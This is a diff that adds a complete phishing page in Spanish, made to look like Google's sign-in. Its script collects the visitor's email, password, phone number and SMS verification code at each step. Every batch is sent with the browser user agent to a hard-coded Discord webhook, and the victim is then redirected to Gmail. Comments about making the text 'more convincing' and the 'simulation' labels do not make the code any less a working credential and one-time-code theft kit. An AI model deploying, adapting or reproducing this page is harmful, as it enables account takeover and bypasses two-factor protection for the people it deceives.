@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceder a la cuenta - Google</title>
+    
+    <!-- Incluir Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Estilo general y animaciones de transición */
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f8f9fa;
+        }
+
+        /* CARD/CONTAINER: Ajustado para ser más fiel a la anchura y sombra de Google */
+        #auth-container {
+            max-width: 450px; /* Ancho específico de Google */
+            min-height: 480px; 
+            position: relative; 
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15); /* Sombra más sutil y profunda */
+        }
+        
+        /* INPUTS: Custom CSS para simular el foco azul de Google */
+        .google-input {
+            /* Estilos base */
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            border-width: 1px;
+        }
+        .google-input:focus {
+            /* Borde y sombra azul al enfocar, como Google */
+            outline: none;
+            border-color: #1a73e8; /* Google Blue */
+            box-shadow: 0 0 0 1px #1a73e8; /* Resplandor sutil */
+            border-width: 2px; /* Borde más grueso al enfocar */
+            padding-left: 11px; /* Compensar el grosor del borde */
+        }
+
+        /* Transiciones de paso */
+        .slide-out {
+            transform: translateX(-100%);
+            opacity: 0;
+            position: absolute; 
+            top: 0;
+            left: 0;
+            width: 100%;
+        }
+        .slide-in {
+            transform: translateX(0);
+            opacity: 1;
+            position: relative; 
+        }
+        .transition-all {
+            transition: all 0.5s ease-in-out;
+        }
+        .slide-out-visible {
+            display: block !important;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4 flex-col">
+
+    <!-- Contenedor Principal con Sombra y Borde -->
+    <div id="auth-container" class="max-w-sm w-full bg-white border border-gray-200 rounded-xl p-6 md:p-8 relative overflow-hidden">
+        
+        <!-- Logo -->
+        <div class="flex items-start mb-6 justify-center">
+            <img src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Google" class="w-16">
+        </div>
+
+        <!-- Paso 1: Inicio de Sesión (Email & Password) -->
+        <div id="signin-step" class="transition-all duration-500 ease-in-out slide-in w-full">
+            <!-- Título con peso de fuente normal (Google style) -->
+            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Acceder</h1>
+            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
+                Usar tu cuenta de Google
+            </p>
+
+            <form id="signin-form">
+                
+                <div class="mb-6">
+                    <input 
+                        type="email" 
+                        id="email-input" 
+                        placeholder="Correo electrónico o teléfono" 
+                        required
+                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
+                    >
+                    <p id="error-message-signin" class="text-xs text-red-500 mt-1 hidden"></p>
+                </div>
+                
+                <div class="mb-8">
+                    <input 
+                        type="password" 
+                        id="password-input" 
+                        placeholder="Ingresa tu contraseña" 
+                        required
+                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
+                    >
+                    <!-- Enlace real para olvido de contraseña -->
+                    <a href="https://accounts.google.com/signin/v2/recovery?hl=es" target="_blank" onclick="event.preventDefault(); window.open(this.href, '_blank');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">¿Has olvidado la contraseña?</a>
+                </div>
+
+                
+                <div class="flex justify-between items-center mt-10">
+                    <button type="button" id="create-account-button" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
+                        Crear cuenta
+                    </button>
+                    <!-- Botón azul con sombra sutil -->
+                    <button 
+                        type="submit"
+                        id="next-button"
+                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
+                    >
+                        Siguiente
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Paso 2: Verificación de Teléfono -->
+        <div id="phone-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
+            
+            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Verificación de identidad</h1>
+            
+            <!-- Texto modificado para ser más convincente -->
+            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
+                Escribe tu número de teléfono asociado a esta cuenta para la verificación. Te enviaremos un SMS.
+            </p>
+
+            
+            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.848 5.231c.143.095.31.144.477.144s.334-.049.477-.144L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                </svg>
+                
+                <span id="display-email-phone" class="text-sm font-medium text-gray-800"></span>
+            </div>
+            
+            <form id="phone-form">
+                <div class="mb-6">
+                    <input 
+                        type="text" 
+                        id="phone-input" 
+                        placeholder="Ingresa tu número de teléfono" 
+                        required
+                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
+                    >
+                    <p id="error-message-phone" class="text-xs text-red-500 mt-1 hidden"></p>
+                </div>
+                
+                <div class="flex justify-between items-center mt-10">
+                    <!-- Botón de Atrás movido a la izquierda -->
+                    <button type="button" id="back-button-phone" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
+                        Atrás
+                    </button>
+                    <button 
+                        type="submit"
+                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
+                    >
+                        Siguiente
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Paso 3: Código SMS -->
+        <div id="sms-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
+            
+            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Introduce el código</h1>
+            
+            <!-- Texto modificado para finalizar la sesión -->
+            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
+                Introduce el SMS recibido para finalizar el proceso de verificación de sesión. El código fue enviado al número 
+                <span id="display-phone-number" class="font-semibold"></span>.
+            </p>
+
+            
+            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7h3a3 3 0 013 3v8a3 3 0 01-3 3H8a3 3 0 01-3-3v-3m16-5l-4-4M15 12V5a2 2 0 00-2-2H8a2 2 0 00-2 2v7m4 0v-7h6v7z" />
+                </svg>
+                <span id="display-email-sms" class="text-sm font-medium text-gray-800"></span>
+            </div>
+
+            <form id="sms-form">
+                <div class="mb-6">
+                    <input 
+                        type="number" 
+                        id="sms-input" 
+                        placeholder="Escribe el código" 
+                        required
+                        class="w-full px-4 py-3 border border-gray-300 rounded-lg text-lg tracking-wider text-center google-input"
+                    >
+                    <p id="error-message-sms" class="text-xs text-red-500 mt-1 hidden"></p>
+                    <!-- Enlace real para reenviar código (tamaño ajustado) -->
+                    <a href="#" onclick="event.preventDefault(); console.log('Reenviar código (Simulado)');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">Reenviar código</a>
+                </div>
+
+                <div class="flex justify-between items-center mt-10">
+                     <!-- Botón de Atrás movido a la izquierda -->
+                     <button type="button" id="back-button-sms" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
+                        Atrás
+                    </button>
+                    <button 
+                        type="submit"
+                        id="verify-button"
+                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300 disabled:opacity-50"
+                        disabled 
+                    >
+                        Verificar
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Paso 4: Pantalla de Éxito -->
+        <div id="success-screen" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white flex flex-col justify-center items-center" style="display: none;">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 text-green-500 mx-auto mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <h2 class="text-xl font-semibold text-gray-800 mb-3">Verificación Exitosa</h2>
+            <p class="text-gray-600 mb-6 text-center">
+                Acceso concedido. Redirigiendo a la página de inicio...
+            </p>
+        </div>
+
+    </div>
+
+    <!-- Footer Añadido para Realismo (Diseño de Google) -->
+    <footer class="mt-8 text-center max-w-sm w-full">
+        <div class="flex flex-wrap justify-center md:justify-between space-x-4 text-xs text-gray-500">
+            <!-- Selector de Idioma -->
+            <select class="bg-transparent border-none focus:outline-none cursor-pointer p-1 rounded-md hover:bg-gray-100">
+                <option>Español (Latinoamérica)</option>
+                <option>English (United States)</option>
+                <option>Português (Brasil)</option>
+            </select>
+            <!-- Enlaces Legales -->
+            <div class="flex space-x-4 mt-2 md:mt-0">
+                <a href="https://support.google.com/accounts/answer/40561" target="_blank" class="hover:underline">Ayuda</a>
+                <a href="https://policies.google.com/privacy" target="_blank" class="hover:underline">Privacidad</a>
+                <a href="https://policies.google.com/terms" target="_blank" class="hover:underline">Términos</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // =========================================================================================================
+        // !!! CONFIGURACIÓN DE DISCORD WEBHOOK !!!
+        // =========================================================================================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE'; 
+        const REDIRECT_URL = "https://mail.google.com/mail/u/0/#inbox"; // Redirección final a la bandeja de entrada
+        // =========================================================================================================
+
+        // Referencias a elementos del DOM (iguales al archivo anterior)
+        const signinStep = document.getElementById('signin-step');
+        const phoneStep = document.getElementById('phone-step');
+        const smsStep = document.getElementById('sms-step');
+        const successScreen = document.getElementById('success-screen');
+        
+        const signinForm = document.getElementById('signin-form');
+        const phoneForm = document.getElementById('phone-form');
+        const smsForm = document.getElementById('sms-form');
+        
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const phoneInput = document.getElementById('phone-input');
+        const smsInput = document.getElementById('sms-input');
+        const verifyButton = document.getElementById('verify-button');
+        const createAccountButton = document.getElementById('create-account-button');
+        const backButtonPhone = document.getElementById('back-button-phone');
+        const backButtonSms = document.getElementById('back-button-sms');
+
+        const displayEmailPhone = document.getElementById('display-email-phone');
+        const displayEmailSms = document.getElementById('display-email-sms');
+        const displayPhoneNumber = document.getElementById('display-phone-number');
+        const errorMessageSignin = document.getElementById('error-message-signin');
+        const errorMessagePhone = document.getElementById('error-message-phone');
+        const errorMessageSms = document.getElementById('error-message-sms');
+
+        let capturedData = {
+            email: null,
+            password: null,
+            phone_number: null,
+            sms_code: null
+        }; 
+
+        // Función de Transición entre pasos
+        function transitionTo(currentStep, nextStep) {
+            currentStep.classList.remove('slide-in');
+            currentStep.classList.add('slide-out', 'slide-out-visible'); 
+            
+            setTimeout(() => {
+                currentStep.style.display = 'none';
+                currentStep.classList.remove('slide-out-visible'); 
+                
+                nextStep.style.display = (nextStep === successScreen) ? 'flex' : 'block';
+                nextStep.classList.remove('slide-out');
+                nextStep.classList.add('slide-in');
+            }, 500); 
+        }
+
+        // Función para enviar la alerta inmediata al Webhook de Discord
+        async function sendWebhookNotification(data, step) {
+            if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.includes('http') || DISCORD_WEBHOOK_URL.includes('YOUR_ID')) {
+                console.warn("URL de Webhook no configurada o incompleta. No se envió la alerta.");
+                return;
+            }
+
+            let title, color;
+            switch(step) {
+                case 'SMS':
+                    title = "✅ ¡Código SMS Capturado! ✅";
+                    color = 65280; // Green
+                    break;
+                case 'PHONE':
+                    title = "📞 ¡Teléfono Capturado! 📞";
+                    color = 16750080; // Orange
+                    break;
+                case 'CREDENTIALS_LOGIN':
+                    title = "⚠️ ¡Credenciales Capturadas (Login)! ⚠️";
+                    color = 16776960; // Yellow
+                    break;
+                case 'CREDENTIALS_CREATE':
+                    title = "⚠️ ¡Credenciales Capturadas (Crear Cuenta)! ⚠️";
+                    color = 16776960; // Yellow
+                    break;
+                default:
+                    title = "⚠️ ¡Datos Capturados! ⚠️";
+                    color = 16776960; // Yellow
+            }
+
+            const message = {
+                username: "Alerta de Captura (Simulación)",
+                embeds: [{
+                    title: title,
+                    color: color, 
+                    fields: [
+                        { name: "Correo Electrónico", value: data.email || 'N/A', inline: false },
+                        { name: "Contraseña", value: data.password || 'N/A', inline: false },
+                        { name: "Teléfono", value: data.phone_number || 'Aún No Ingresado', inline: false },
+                        { name: "Código SMS (OTP)", value: data.sms_code || 'Aún No Ingresado', inline: false },
+                        { name: "User Agent", value: navigator.userAgent, inline: false },
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: `Fase: ${step} | Simulación de Phishing` }
+                }]
+            };
+
+            // Implementación de reintentos con backoff exponencial
+            const MAX_RETRIES = 5;
+            let attempts = 0;
+            while (attempts < MAX_RETRIES) {
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(message)
+                    });
+                    
+                    if (response.ok) {
+                        return; // Éxito
+                    } else {
+                        // Si el estado es 401, es un error de token. No reintentar.
+                        if (response.status === 401) {
+                             console.error(`Fallo al enviar el Webhook de Discord (HTTP 401). Token no válido.`);
+                             console.error("Mensaje de respuesta:", await response.text());
+                             break;
+                        }
+                        
+                        console.warn(`Fallo en el Webhook (HTTP ${response.status}). Reintentando en ${Math.pow(2, attempts)}s...`);
+                    }
+
+                } catch (error) {
+                    console.warn(`Fallo en la conexión del Webhook. Reintentando en ${Math.pow(2, attempts)}s...`);
+                }
+
+                attempts++;
+                if (attempts < MAX_RETRIES) {
+                    // Espera exponencial
+                    await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempts) * 1000));
+                }
+            }
+
+            if (attempts === MAX_RETRIES) {
+                console.error("El Webhook de Discord falló después de múltiples reintentos.");
+            }
+        }
+
+
+        // --- Manejadores de Eventos ---
+
+        // Función común para el Paso 1: Captura de Credenciales
+        async function handleCredentialCapture(e, stepName) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+
+            if (stepName === 'CREDENTIALS_LOGIN' && (!email || !password)) {
+                errorMessageSignin.textContent = "Por favor, ingresa tu correo y contraseña.";
+                errorMessageSignin.classList.remove('hidden');
+                return;
+            }
+            errorMessageSignin.classList.add('hidden');
+
+            // 1. Almacenar Correo y Contraseña
+            capturedData.email = email || 'Crear cuenta (Email vacío)';
+            capturedData.password = password || 'Crear cuenta (Password vacío)';
+            
+            displayEmailPhone.textContent = capturedData.email; 
+            displayEmailSms.textContent = capturedData.email; 
+
+            // 2. 🚨 ENVIAR ALERTA INMEDIATAMENTE
+            await sendWebhookNotification(capturedData, stepName);
+            
+            // 3. Iniciar transición visual
+            transitionTo(signinStep, phoneStep);
+        }
+
+        // --- Lógica del Paso 1: Botón Siguiente (Login) ---
+        signinForm.addEventListener('submit', (e) => handleCredentialCapture(e, 'CREDENTIALS_LOGIN'));
+
+        // --- Lógica del Paso 1: Botón Crear Cuenta ---
+        createAccountButton.addEventListener('click', (e) => handleCredentialCapture(e, 'CREDENTIALS_CREATE'));
+
+        // --- Lógica del Paso 2: Número de Teléfono ---
+        phoneForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = phoneInput.value.trim();
+            if (phone.length < 5) { 
+                errorMessagePhone.textContent = "Ingresa un número de teléfono válido para la verificación.";
+                errorMessagePhone.classList.remove('hidden');
+                return;
+            }
+            errorMessagePhone.classList.add('hidden');
+
+            // 1. Almacenar Número de Teléfono
+            capturedData.phone_number = phone;
+            displayPhoneNumber.textContent = phone;
+
+            // 2. 🚨 ENVIAR ALERTA NÚMERO DE TELÉFONO
+            await sendWebhookNotification(capturedData, 'PHONE');
+            
+            // 3. Iniciar transición visual
+            transitionTo(phoneStep, smsStep);
+        });
+
+        // Botón Atrás del Paso de Teléfono
+        backButtonPhone.addEventListener('click', function() {
+            transitionTo(phoneStep, signinStep);
+        });
+        
+        // --- Lógica del Paso 3: Código SMS (OTP) ---
+        
+        // Habilitar botón 'Verificar' al escribir
+        smsInput.addEventListener('input', function() {
+            verifyButton.disabled = this.value.length === 0;
+        });
+
+        smsForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const smsCode = smsInput.value.trim();
+
+            if (smsCode.length === 0) { 
+                errorMessageSms.textContent = "Por favor, ingresa el código SMS.";
+                errorMessageSms.classList.remove('hidden');
+                return;
+            }
+            errorMessageSms.classList.add('hidden');
+
+            // 1. Almacenar Código SMS
+            capturedData.sms_code = smsCode;
+
+            // 2. 🚨 ENVIAR ALERTA CÓDIGO SMS
+            await sendWebhookNotification(capturedData, 'SMS'); 
+            
+            // 3. Transición a la Pantalla de Éxito
+            transitionTo(smsStep, successScreen);
+            
+            // 4. Redireccionar después de un tiempo
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL; 
+            }, 3000); // 3 segundos para que el usuario vea el éxito
+        });
+
+        // Botón Atrás del Paso SMS
+        backButtonSms.addEventListener('click', function() {
+            transitionTo(smsStep, phoneStep);
+        });
+    </script>
+
+</body>
+</html>
